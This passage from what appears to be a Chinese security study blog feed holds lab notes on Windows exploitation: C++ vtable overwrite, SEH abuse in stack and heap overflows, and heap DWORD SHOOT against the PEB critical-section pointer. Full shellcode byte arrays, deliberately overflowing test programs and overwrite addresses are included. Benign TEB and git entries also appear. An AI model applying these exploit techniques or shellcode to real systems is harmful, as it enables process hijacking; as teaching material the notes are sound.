    "\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"
    "\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"
    "\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"
    "\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x50\xAE\x42\x00";        // set fake virtual function pointer

class Failwest
{
public:
    char buf[200];
    virtual void test(void)
    {
        cout&lt;&lt;"Class Vtable::test()"&lt;&lt;endl;
    };
};

Failwest overflow, *p;

void main(void)
{
    char *p_vtable;
    p_vtable = overflow.buf - 4;        //point to virtual table
    // reset fake virtual table to 0x004088cc
    // the address mat need to ajusted via runtime debug
    __asm int 3;
    p_vtable[0] = 0x00;
    p_vtable[1] = 0xAF;
    p_vtable[2] = 0x42;
    p_vtable[3] = 0x00;
    strcpy(overflow.buf, shellcode);    // set fake virtual function pointer
    p = &overflow;
    p->test();
}
</code></pre>

<p>C++虚函数利用原理图：<br><img src="/images/2017-07-01/vtable.jpg" alt="C++虚函数利用原理图"></p>
<p>首先需要知道的是：</p>
<ul>
<li>idata: 明显是一个Imports函数的代码段，这里集中所有外部函数地址，代码中会先跳到该地址后再执行，PE文件加载器在开始会获取真实的函数地址来修补idata段中的函数地址。</li>
<li>data: 这个段存放程序的全局数据、全局常量等。</li>
<li>rdata: 名字上看就是资源数据段，程序用到什么资源数据都在这里，资源包括你自己封包的，也包括开发工具自动封包的。</li>
</ul>
<p>所以我们应该在data段中找到自己需要的实验的全局变量</p>
<font color="#f00">局部变量在栈中</font>


<p>得到shellcode起始地址：0x0042AE50<br>shellcode结束地址：0x0042AF00</p>
<h3 id="实验结果"><a href="#实验结果" class="headerlink" title="实验结果"></a>实验结果</h3><p><img src="/images/2017-07-01/result1.jpg" alt="实验结果"></p>
]]></content>
      
        <categories>
            
            <category> 安全技术 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> windows </tag>
            
            <tag> c++ </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[TEB简介]]></title>
      <url>/2017/06/30/TEB%E7%AE%80%E4%BB%8B/</url>
      <content type="html"><![CDATA[<h3 id="TEB特点"><a href="#TEB特点" class="headerlink" title="TEB特点"></a>TEB特点</h3><ol>
<li>一个进程可能同时有多个线程</li>
<li>每个线程都有一个线程环境块TEB</li>
<li>第一个TEB开始于0x7FFDE000</li>
<li>之后新建的线程的TEB将紧随前边的TEB，之间相隔0x100字节，并向内存地址方向</li>
<li>线程退出时，对应的TEB也被销毁，腾出的TEB空间被新建的线程重复使用。</li>
</ol>
<p>线程环境块的预测图：<br><img src="/images/2017-06-30/TEB_prediction.jpg" alt="线程环境块的预测图"></p>
<h3 id="TEB结构"><a href="#TEB结构" class="headerlink" title="TEB结构"></a>TEB结构</h3><p>由于TEB才是初学，对里面的很多结构都不怎么了解，写这一节主要是为了贴一张图，方便以后补充！</p>
<p><img src="/images/2017-06-30/TEB.jpg" alt="TEB"></p>
<p>当然为了充实被本篇博客，笔者提供几个小程序：</p>
<p><br></p>
<font color="#0f0">从FS寄存器获取当前线程</font>

<pre><code>
int GetThreadId()
{
    int ithread = 0;
    _asm{
        xor esi , esi
        mov eax, fs:[esi+18h]     
        mov ecx, [eax+ 20h] 
        mov eax, [eax+ 24h]
        mov dword ptr[ithread], eax
    }
    return ithread;
}

</code></pre>

<p><br></p>
<font color="#0f0">从FS寄存器获取当前进程ID</font>

<pre><code>
int GetProcessId()
{
    int iProcess = 0;
    _asm{
        xor esi , esi
        mov eax, fs:[esi+18h]
        mov ecx, [eax+ 20h]
        mov eax, [eax+ 24h]
        mov dword ptr[iProcess ], ecx
    }
    return iProcess;
}

</code></pre>
]]></content>
      
        <categories>
            
            <category> 安全技术 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> windows </tag>
            
            <tag> TEB </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[使用git在github上创建新工程]]></title>
      <url>/2017/06/30/%E4%BD%BF%E7%94%A8git%E5%9C%A8github%E4%B8%8A%E5%88%9B%E5%BB%BA%E6%96%B0%E5%B7%A5%E7%A8%8B/</url>
      <content type="html"><![CDATA[<p>这段时间进经常会忘记如何在github上同步工程，于是又得查资料，查参考书，浪费了很长时间，因此有了感触，写几篇有关此类问题的篇章！</p>
<font color="#f00">这是老手新手都十分容易犯的错误，就是在创建一个新github项目或者以本地已有项目为原型重新创建一个github项目时，容易创建一个空文件夹就直接关联远程仓库，这样做只会返回错误！！！所以，文件夹一定不能为空......</font>

<h3 id="创建新工程需要的命令"><a href="#创建新工程需要的命令" class="headerlink" title="创建新工程需要的命令"></a>创建新工程需要的命令</h3><h4 id="完成本地项目与git的关联"><a href="#完成本地项目与git的关联" class="headerlink" title="完成本地项目与git的关联"></a>完成本地项目与git的关联</h4><pre><code>
cd 工程目录
git init    //初始化本地仓库，当前目录下会出现一个名为 .git 的目录
git add .    //将所有文件添加到缓存区，告诉 Git 开始对这些文件进行跟踪
git commit -am "Hello"    //提交文件到本地仓库

</code></pre>

<h4 id="完成远程项目的创建"><a href="#完成远程项目的创建" class="headerlink" title="完成远程项目的创建"></a>完成远程项目的创建</h4><p>在github上创建某个项目，然后可以拷贝处该项目的地址</p>
<h4 id="关联远程仓库（github上创建的地址）"><a href="#关联远程仓库（github上创建的地址）" class="headerlink" title="关联远程仓库（github上创建的地址）"></a>关联远程仓库（github上创建的地址）</h4><pre><code>
git remote add origin https://github.com/Introspelliam/Hello.git    //关联远程仓库

</code></pre>

<h4 id="push本地项目到远程仓库"><a href="#push本地项目到远程仓库" class="headerlink" title="push本地项目到远程仓库"></a>push本地项目到远程仓库</h4><pre><code>
git push origin master     //push项目到master
Username for 'https://github.com': //你的github账户名称

</code></pre>


<h3 id="github上提供的工程创建方法"><a href="#github上提供的工程创建方法" class="headerlink" title="github上提供的工程创建方法"></a>github上提供的工程创建方法</h3><p><b>…or create a new repository on the command line</b></p>
<pre><code>echo &quot;# ctf-challenges&quot; &gt;&gt; README.md
git init
git add README.md
git commit -m &quot;first commit&quot;
git remote add origin https://github.com/Introspelliam/ctf-challenges.git
git push -u origin master
</code></pre><p><b>…or push an existing repository from the command line</b></p>
<pre><code>git remote add origin https://github.com/Introspelliam/ctf-challenges.git
git push -u origin master
</code></pre>]]></content>
      
        <categories>
            
            <category> tool </category>
            
        </categories>
        
        
        <tags>
            
            <tag> git </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[windows 异常处理中的漏洞利用]]></title>
      <url>/2017/06/29/windows-%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%E4%B8%AD%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</url>
      <content type="html"><![CDATA[<h3 id="1-S-E-H概述"><a href="#1-S-E-H概述" class="headerlink" title="1. S.E.H概述"></a>1. S.E.H概述</h3><p>SEH即异常处理结构体(Structure Exception Handler)，其中包含两个DWORD指针：SEH链表指针和异常处理函数句柄。</p>
<p>几个要点：</p>
<ol>
<li>SEH结构体放在系统栈中</li>
<li>当线程初始化时，会自动向栈中安装一个SEH，作为线程默认的异常处理</li>
<li>如果程序源代码中使用<strong>try{}</strong>except{}或者Assert宏等异常处理机制，编译器将最终将通过向当前函数栈帧中安装一个SEH来实现异常处理</li>
<li>栈中一般会同时存在多个SEH</li>
<li>栈中的多个SEH通过链表指针在栈内由栈顶向栈底串成单项链表，位于链表最顶端的SEH通过TEB(线程环境块)0字节偏移处的指针标识</li>
<li>当异常发生时，操作系统会中断程序，并首先从TEB的0字节偏移处取出距离栈顶最近的SEH，使用异常处理函数句柄所指向的代码来处理异常。</li>
<li>当离“事故现场”最近的异常处理函数运行失效时，将顺着SEH链表依次尝试其他的异常处理函数</li>
<li>如果程序安装的所有异常处理函数都不能处理，系统将采用默认的异常处理函数。通过这个函数弹出一个对话框，然后强制关闭程序。</li>
</ol>
<p><img src="/images/2017-06-28/seh.jpg" alt="SEH原理图"></p>
<p>利用SEH的原理：</p>
<ol>
<li>SEH放在栈内，可以缓冲区淹没SEH</li>
<li>精心制造溢出数据可以把SEH中异常处理函数的入口地址更改为shellcode的起始地址</li>
<li>溢出后错误的栈帧或堆块数据往往会触发异常</li>
<li>在Windows开始处理溢出的异常时，会错误地把shellcode当作异常处理函数而执行</li>
</ol>
<h3 id="2-栈溢出中利用SEH"><a href="#2-栈溢出中利用SEH" class="headerlink" title="2. 栈溢出中利用SEH"></a>2. 栈溢出中利用SEH</h3><h4 id="2-1-获取shellcode起始地址和SEH地址"><a href="#2-1-获取shellcode起始地址和SEH地址" class="headerlink" title="2.1 获取shellcode起始地址和SEH地址"></a>2.1 获取shellcode起始地址和SEH地址</h4><p>测试代码</p>
<pre><code>
#include <windows.h>
#include <stdio.h>

char shellcode[] = "\x90\x90\x90\x90";


DWORD MyExceptionhandler(void)
{
    printf("got an exception,  press Enter to kill process!\n");
    getchar();
    ExitProcess(1);
    return 1;
}

void test(char *input)
{
    char buf[200];
    int zero = 0;
    __asm int 3;        // used to break process for debug
    __try
    {
        strcpy(buf, input);  // overrun the stack
        zero = 4/zero;        // generate an exception
    }
    __except(MyExceptionhandler()){}
}

void main()
{
    test(shellcode);
}
</stdio.h></windows.h></code></pre>

<p><b>根据Ollydbg得到结论</b></p>
<font color="#f00">shellcode起始位置为0x0012FE48<br>离栈顶栈顶最近的SEH链表指针地址为0x0012FF18，其异常处理函数句柄地址为0x0012FF1C<br>shellcode起始地址与异常处理句柄地址之间共有212个字节间隙，也就是说，超出缓冲区8字节后的部分将覆盖SEH链的第一个SEH：由于SEH链表指针为0x90909090，所以为无效地址，系统为默认其为最终的异常处理；而而处理函数句柄内的地址是shellcode起始地址，那么就会跳转至此进行函数执行。</font>

<h4 id="2-2-编写shellcode"><a href="#2-2-编写shellcode" class="headerlink" title="2.2 编写shellcode"></a>2.2 编写shellcode</h4><pre><code>
char shellcode[] = 
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"
    "\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"
    "\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"
    "\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"
    "\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"
    "\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"
    "\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"
    "\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"
    "\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"
    "\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"
    "\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x48\xFE\x12\x00";

</code></pre>

<p>注意在执行的时候去掉__asm int 3调试</p>
<h3 id="3-堆溢出中利用SEH"><a href="#3-堆溢出中利用SEH" class="headerlink" title="3. 堆溢出中利用SEH"></a>3. 堆溢出中利用SEH</h3><pre><code>
#include &lt;windows.h&gt;

char shellcode[] = 
    "\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"
    "\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"
    "\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"
    "\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"
    "\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"
    "\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"
    "\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"
    "\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"
    "\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"
    "\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"
    "\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x16\x01\x1A\x00\x00\x10\x00\x00"    // heap of the ajacent free block(尾块)
    "\x88\x06\x36\x00"        //0x00360688 is the address of shellcode in first Heapblock
    "\x90\x90\x90\x90";        //target of DWORD SHOOT

DWORD MyExceptionhandler(void)
{
    ExitProcess(1);
    return 0;
}

int main()
{
    HLOCAL h1=0, h2=0;
    HANDLE hp;
    hp = HeapCreate(0, 0x1000, 0x10000);
    h1 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 200);
    memcpy(h1, shellcode, 0x200);    // overflow here
                                    // noticed 0x200 means 512
    __asm int 3                // used to break the process
    __try
    {
        h2 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 8);
    }
    __except(MyExceptionhandler()){}
    return 0;
}

</code></pre>

<p>实验方案：</p>
<ol>
<li>溢出第一个堆块的数据将写入后面的空闲堆块，第二次分配的时候发生DWORD SHOOT。</li>
<li>将SEH的异常回调函数地址作为DWORD SHOOT目标，将其替换为shellcode入口地址，异常发生后，操作系统将错误地把shellcode当作异常处理函数而执行。</li>
</ol>
<p>得到的DWORD的目标地址后，就可以去掉中断指令，更改DWORD SHOOT的目标地址，重新执行</p>
<font color="#f00">遗憾的是，该实验我做了很多次，最后都是无功而返，没有试验现象，到目前为止不知道原因！！！！</font>

<h3 id="4-Windows异常处理"><a href="#4-Windows异常处理" class="headerlink" title="4. Windows异常处理"></a>4. Windows异常处理</h3><h4 id="4-1-不同级别的SEH"><a href="#4-1-不同级别的SEH" class="headerlink" title="4.1 不同级别的SEH"></a>4.1 不同级别的SEH</h4><p>异常处理流程：</p>
<ul>
<li>首先执行线程中距离栈顶最近的SEH异常处理函数</li>
<li>若失败，则依次尝试执行SEH链表中的后续异常处理函数</li>
<li>若SEH链中所有的异常处理函数都没能处理异常，则执行进程中的异常处理</li>
<li>若仍然失败，系统默认的异常处理函数将被调用，程序崩溃窗口将被弹出</li>
</ul>
<h4 id="4-2-线程的异常处理"><a href="#4-2-线程的异常处理" class="headerlink" title="4.2 线程的异常处理"></a>4.2 线程的异常处理</h4><p>线程中用于处理异常的回调函数有4参数：</p>
<ol>
<li>pExcept：指向非常重要的结构体EXCEPTION_RECORD。该结构体包含若干与异常相关的信息，如异常的类型、异常发生的地址等</li>
<li>pFrame：指向栈帧中SEH结构体</li>
<li>pContext：指向Context结构体。该结构体中包含所有寄存器的状态</li>
<li>pDispatch：位置用途</li>
</ol>
<p>返回值：<br>0（ExceptionContinueExecution）：异常被成功处理，将返回原程序发生异常的地方，继续执行后续指令。<br>1（ExceptionContinueSearch）：代表异常处理失败，将顺着SEH链表搜索其他可用于异常处理的函数并尝试处理。</p>
<p><img src="/images/2017-06-28/unwind.jpg" alt="unwind处理过程"></p>
<p>异常处理函数的第一轮调用用来尝试处理异常，而第二轮的unwind调用时，往往执行的是释放资源等操作。</p>
<h4 id="4-3-进程的异常处理"><a href="#4-3-进程的异常处理" class="headerlink" title="4.3 进程的异常处理"></a>4.3 进程的异常处理</h4><p>如果异常没被线程的异常处理函数或调试器处理掉，将交给进程中的异常处理函数。</p>
<p>通过API函数SetUnhandledExceptionFilter来注册，其是kernel32.dll的导出函数。</p>
<font color#f00="">提示：把线程异常处理对应代码中<strong>try{}</strong>except(){}或者Assert等语句，把进程的异常处理对应于函数SetUnhandledExceptionFilter</font>

<p>返回值：</p>
<ul>
<li>1(EXCEPTION_EXECUTE_HANDLER):表示错误得到正确的处理，程序将退出</li>
<li>0(EXCEPTION_CONTINUE_SEARCH):无法处理错误，将错误转交给系统默认的异常处理</li>
<li>-1(EXCEPTION_CONTINUE_EXECUTION):表示错误得到正确处理，并将继续执行下去。类似于线程的异常处理函数，系统会用回调函数会付出异常发生时的断点状况。但这时引起异常的寄存器应该已经得到了恢复。</li>
</ul>
<h4 id="4-4-系统默认异常处理UEF"><a href="#4-4-系统默认异常处理UEF" class="headerlink" title="4.4 系统默认异常处理UEF"></a>4.4 系统默认异常处理UEF</h4><p>如果进程异常处理失败或用户根本没有注册进程异常处理，系统默认的异常处理函数UnhandledExceptionFilter()将被调用。</p>
<h4 id="4-5-异常处理流程总结"><a href="#4-5-异常处理流程总结" class="headerlink" title="4.5 异常处理流程总结"></a>4.5 异常处理流程总结</h4><ul>
<li>CPU执行发生并捕获异常，内核结果进程的控制权，开始内核态的异常处理</li>
<li>内核异常处理结束，将控制权还给ring3</li>
<li>ring3中第一个处理异常的函数是ntdll.dll中的KiUserExceptionDispatcher()函数</li>
<li>KiUserExceptionDispatcher()首先会检查程序是否处于调试状态。如果程序正被调试，会将异常交给调试器进行处理</li>
<li>在非调试状态下，KiUserExceptionDispatcher()调用RtlDispatchException()函数对线程的SEH链表进行遍历，如果找到能够处理异常的回调函数，将再次遍历先前调用过的SEH句柄，即unwind操作，以保证异常处理机制自身的完整性</li>
<li>如果栈中所有的SEH都失败了，且用户曾经使用过SetUnhandledExceptionFilter()函数设定进程异常处理，则这个异常处理将被调用。</li>
<li>如果用户自定义的进程异常处理失败，或者用户根本没有定义进程异常处理，那么系统默认的异常处理UnhandledExceptionFilter()将被调用。UEF会根据注册表里的相关信息决定是默默关闭程序，还是弹出错误对话框</li>
</ul>
<h3 id="5-其他异常处理机制的利用思路"><a href="#5-其他异常处理机制的利用思路" class="headerlink" title="5. 其他异常处理机制的利用思路"></a>5. 其他异常处理机制的利用思路</h3><h4 id="5-1-VEH利用"><a href="#5-1-VEH利用" class="headerlink" title="5.1 VEH利用"></a>5.1 VEH利用</h4><p>VEH（Vectored Exception Handler，向量化异常处理）</p>
<ol>
<li>VEH和进程异常处理类似，都是基于进程的，而且需要使用API注册回调函数</li>
<li>可注册多个VEH。VEH结构体之间串成双向链表，因此比SEH多了一个前向指针</li>
<li>VEH处理优先级次于调试器处理，高于SEH处理。先KiUserExceptionDispatcher，再VEH，最后SEH</li>
<li>VEH保存在堆中</li>
<li>unwind操作只对栈帧中的SEH链起作用，不会涉及VEH这种进程类的异常处理</li>
</ol>
<p><a href="/others/2017-06-28/bh-win-04-litchfield.ppt">Windows heap overfows</a><br>如果能利用堆溢出的DWORD SHOOT修改VEH头结点指针，在异常处理开始后，并能引导程序去执行shellcode</p>
<h4 id="5-2-攻击TEB中的SEH头节点"><a href="#5-2-攻击TEB中的SEH头节点" class="headerlink" title="5.2 攻击TEB中的SEH头节点"></a>5.2 攻击TEB中的SEH头节点</h4><p>异常发生时，异常处理机制会遍历SEH链表中寻找合适的出错函数。线程SEH链通过TEB的第一个DWORD标识(fs:0)，这个指针永远指向离栈顶最近的那个SEH。如果能够修改TEB中的这个指针，在异常发生时就能将程序引导到shellcode中去执行</p>
<p><a href="/images/2017-06-28/halvarflake-winsec02.ppt">Third Generation Exploition</a></p>
<h4 id="5-3-攻击UEF"><a href="#5-3-攻击UEF" class="headerlink" title="5.3 攻击UEF"></a>5.3 攻击UEF</h4><p>如果能通过DWORD SHOOT把这个处理函数覆盖为shellcode的入口地址，再制造一个其他异常处理无法解决的异常，那么系统将使用UEF作为最后一根救命稻草来解决异常时，shellcode就被执行。</p>
<h4 id="5-4-攻击PEB中的函数指针"><a href="#5-4-攻击PEB中的函数指针" class="headerlink" title="5.4 攻击PEB中的函数指针"></a>5.4 攻击PEB中的函数指针</h4><p>前面博客有讲</p>
]]></content>
      
        <categories>
            
            <category> 安全技术 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> windows </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[堆溢出利用（下）—— 代码植入]]></title>
      <url>/2017/06/26/%E5%A0%86%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8%EF%BC%88%E4%B8%8B%EF%BC%89%E2%80%94%E2%80%94-%E4%BB%A3%E7%A0%81%E6%A4%8D%E5%85%A5/</url>
      <content type="html"><![CDATA[<h3 id="1-DWORD-SHOOT的利用方法"><a href="#1-DWORD-SHOOT的利用方法" class="headerlink" title="1 DWORD SHOOT的利用方法"></a>1 DWORD SHOOT的利用方法</h3><p>堆溢出更加精确，往往直接狙击重要目标。精准是DWORD SHOOT的优点，但是“火力不足”有时也会限制堆溢出的利用，这样就需要选择最重要的目标来“狙击”。</p>
<p>本节将介绍内存中常用的“狙击目标”，然后以修改PEB（进程环境块）中的同步函数指针为例，给出完整利用堆溢出执行shellcode的例子。</p>
<p>DWORD SHOOT的常用目标(Windows XP SP1之前的平台)大概可概括为以下几类：</p>
<ul>
<li>内存变量：修改能够影响程序执行的重要标志变量，往往可以改变程序流程。如：更改身份验证函数的返回值就可以通过认证机构。</li>
<li>代码逻辑：修改代码段重要函数的关键逻辑有时候可以达到一定攻击效果。如：程序分支处的判断逻辑，或者把身份验证函数的调用指令覆盖为0x90(nop)。这种方法虽然类似于软件破解技术中的“爆破”——通过更改一个字节而改变整个程序的流程。</li>
<li>函数返回地址：栈溢出通过修改函数返回地址能够劫持进程，堆溢出也一样能够利用DWORD SHOOT更改函数返回地址。但是由于栈帧移位的原因，函数返回地址往往是不固定的，甚至在同一操作系统和补丁版本下连续运行两次栈状态都会有不同，故DWORD SHOOT在这种情况下有局限，靶子不好瞄准。</li>
<li>攻击异常处理机制：当程序产生异常时，Windows会转入异常处理机制。堆溢出很容易引起异常，因此异常处理机制所使用重要数据结构往往会成为DWORD SHOOT的上等目标，这包括S.E.H（structure exception handler）、F.V.E.H（First Vectored Exception Handler）、进程环境块(P.E.B)中的U.E.F(Unhandled Exception Filter)、线程环境块(T.E.B)中存放的第一个S.E.H指针(T.E.H)。</li>
<li>函数指针：系统优势会使用函数指针呢。比如动态链接库中的函数、C++中的虚函数调用等。改写这些函数指针后，在函数调用发生后往往可以成功地劫持进程。</li>
<li>P.E.B中线程同步函数的入口地址：PEB存放着一对同步函数指针，指向RtlEnterCriticalSection()和RtlLeaveCriticalSection()，并且进程退出时会被ExitProcess()调用。如果能够通过DWORD SHOOT修改这对指针中的一个，那么就能在程序退出时ExitProcess()将会被骗去调用我们的shellcode。由于PEB的位置始终不会变化，这对指针在PEB中的偏移也始终不变，这使得利用堆溢出开发适用于不同操作系统版本和补丁版本的exploit成为可能。<font color="#f00">这是Windows平台下堆溢出利用的最经典方法之一。</font></li>
</ul>
<h3 id="2-狙击PEB中的RtlEnterCriticalSection-的函数指针"><a href="#2-狙击PEB中的RtlEnterCriticalSection-的函数指针" class="headerlink" title="2 狙击PEB中的RtlEnterCriticalSection()的函数指针"></a>2 狙击PEB中的RtlEnterCriticalSection()的函数指针</h3><p>windows为了同步进程下的多个线程，使用了同步措施，如锁措施(lock)、信号量(semaphore)、临界区(critical section)等。<br>当进程退出时，ExitProcess()函数要用到临界区函数RtlEnterCriticalSection和RtlLeaveCriticalSection()来同步线程防止脏数据的产生。</p>
<p>通过进程环境块PEB偏移0x20处存放函数指针来间接完成调用临界区函数。具体就是0x7FFDF020处存放指向RtlEnterCriticalSection()的指针，在0x7FFDF024处存指向RtlLeaveCriticalSection()的指针。</p>
<font color="#f00">从Windows 2003 Server开始修改这部分的实现。</font>

<h4 id="2-1-实验代码如下"><a href="#2-1-实验代码如下" class="headerlink" title="2.1 实验代码如下"></a>2.1 实验代码如下</h4><pre><code>#include &lt;windows.h&gt;

char shellcode[] = &quot;\x90\x90\x90\x90\x90\x90\x90\x90...&quot;;

main()
{
    HLOCAL h1=0, h2=0;
    HANDLE hp;
    hp = HeapCreate(0, 0x1000, 0x10000);
    h1 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 200);
    __asm int 3        //used to break process
    memcpy(h1, shellcode, 0x200);    //overflow, 0x200=512
    h2 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 8);
    return 0;
}
</code></pre><h4 id="2-2-实验步骤"><a href="#2-2-实验步骤" class="headerlink" title="2.2 实验步骤"></a>2.2 实验步骤</h4><ol>
<li>h1向堆中申请200字节的空间</li>
<li>memcpy的上限错误地写成了0x200，这实际上是512字节，会产生溢出</li>
<li>h1分配完之后，后面紧跟一个大空闲块（尾块）</li>
<li>超过200字节的数据将覆盖尾块块首</li>
<li>用伪造的指针覆盖尾块块首中的 空表指针，当h2分配时，将导致DWORD_SHOOT</li>
<li>DWORD SHOOT的目标是0x7FFDF020处的RtlEnterCriticalSection()函数指针，可以简单地将其修改为shellcode位置</li>
<li>DWORD_SHOOT完毕后，堆溢出导致异常，最终导致调用ExitProcess()结束进程</li>
<li>ExitProcess()在结束进程时需要调用临界区函数来同步线程，但却从PEB中拿出了指针指向shellcode的指针，因此shellcode被执行</li>
</ol>
<h4 id="2-3-实验细节"><a href="#2-3-实验细节" class="headerlink" title="2.3 实验细节"></a>2.3 实验细节</h4><p>当实验中shellcode为200字节0x90，执行到0x00401085,也就是memcpy函数结束，堆中状态如下图所示（<font color="#0f0">不知道是什么原因，无论shellcode多大，最后使用memcpy(h1, shellcode, 0x200)之后，都会使尾块不见！！！尾块一般的flag标志位0x10</font>）：<br><img src="/images/2017-06-26/dword_shoot_shellcode.jpg" alt="200字节时的堆区"></p>
<p>当然这并不重要，重要的是这里面仍然有堆溢出。<br>缓冲区的布置如下：<br>(1) 将那段168字节的shellcode用0x90补充为200字节。<br>(2) 紧随其后，附上8字节的块首信息。为了防止在DWORD SHOOT发生之前产生异常，不放直接将块首从内存中复制使用&quot;\x16\x01\x1A\x00\x00\x10\x00\x00&quot;<br>(3) 前向指针是DWORD SHOOT的子弹，这里直接使用shellcode的起始地址0x00360688.<br>(4) 后向指针是DWORD SHOOT的“目标”，这里填入PEB的函数指针地址0x7FFDF020.</p>
<p>如果缓冲区内容如下:</p>
<pre><code>
char shellcode[] =
    "\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\90\x90\x90\x90\x90\x90\x90\x90\x90"

    // MessageBoxA with tile "failwest" and context "failwest"
    "\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"
    "\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"
    "\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"
    "\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"
    "\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"
    "\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"
    "\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"
    "\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"
    "\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"
    "\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"
    "\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90"

    "\x16\x01\x1A\x00\x00\x10\x00\x00"    // head of the ajacent free block
    "\x88\x06\x36\x00\x20\xf0\xfd\x7f";    // 0x00360688 is the address of shellcode in first heap block
                                        // you have to make sure this address via debug
                                        // 0x7ffdf020 is the position in the PEB which hold a pointer to
                                        // RtlEnterCriticalSection() and will called by ExitProcess() at last
</code></pre>

<p>那个消息框不会显示，原因是被修改的P.E.B里的函数指针不光会被ExitProcess()调用，shellcode中的函数也会使用。当shellcode的函数使用临界区时，会像ExitProcess()一样被骗。</p>
<p>为此，需要对shellcode进行修改，在一开始就将DWORD SHOOT的指针修复回去，以防出错。重新调试，发现0x7FFDF020处的函数指针是0x77F82060.</p>
<font color="#f00">P.E.B中RtlEnterCriticalSection()函数指针位置0x7ffdf020不会变，但是所指向的地址会变。劫持进程之后，一定要修复回劫持之前的值，否则会出现各种问题！</font>

<pre><code>

#include &lt;windows.h&gt;

char shellcode[] =
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"

    // repaire the pointer which shooted by heap over run
    "\xB8\x20\xF0\xFD\x7F"        // MOV EAX, 7FFDF020
    "\xBB\x60\x20\xF8\x77"        // MOV EBX, 0x77F86020 the address
                                // may releated to your OS
    "\x89\x18"                    // MOV DWORD PTR DS:[EAX], EBX

